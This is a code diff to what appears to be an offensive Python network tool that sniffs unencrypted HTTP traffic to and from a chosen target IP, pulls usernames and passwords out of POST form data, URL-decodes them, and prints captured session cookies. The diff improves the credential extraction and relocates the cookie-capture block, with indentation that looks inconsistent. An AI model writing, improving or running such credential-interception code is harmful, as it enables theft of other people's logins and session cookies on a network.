@@ -12,6 +12,7 @@ import ctypes
 import subprocess
 import requests
 import re
+import urllib.parse  # Import urllib to decode URL-encoded values
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -80,8 +81,9 @@ class Device:
                     if "POST" in raw_data:
                         # Form field recognition for credentials
                         if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']) and \
-                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'heslo', 'passwd']):
+                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
                             print(f"{Fore.GREEN}[!] Possible Credentials Found:{Style.RESET_ALL}")
+                            
                             # Find login information
                             login_data = None
                             for field in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']:
@@ -92,21 +94,30 @@ class Device:
                                         break
                             # Find password information
                             password_data = None
-                            for field in ['password', 'pass', 'pwd', 'heslo', 'passwd']:
+                            for field in ['password', 'pass', 'pwd', 'heslo']:
                                 if field in raw_data.lower():
                                     password_data = re.search(rf'{field}=[^&]*', raw_data)
                                     if password_data:
                                         password_data = password_data.group().split('=')[1]
                                         break
+                            
+                            # Decode URL-encoded data
+                            if login_data:
+                                login_data = urllib.parse.unquote(login_data)  # Decode URL-encoded login
+                            if password_data:
+                                password_data = urllib.parse.unquote(password_data)  # Decode URL-encoded password
+                            
                             # Print login and password found
                             if login_data and password_data:
                                 print(f"{Fore.GREEN}login: {login_data}{Style.RESET_ALL}")
                                 print(f"{Fore.GREEN}pwd: {password_data}{Style.RESET_ALL}")
 
-                    if "Set-Cookie:" in raw_data:
-                        cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
-                        print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
+            # Optional: You can also capture cookies and other sensitive data
+            if "Set-Cookie:" in raw_data:
+                cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
+                print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
 
+        # Start sniffing HTTP packets
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
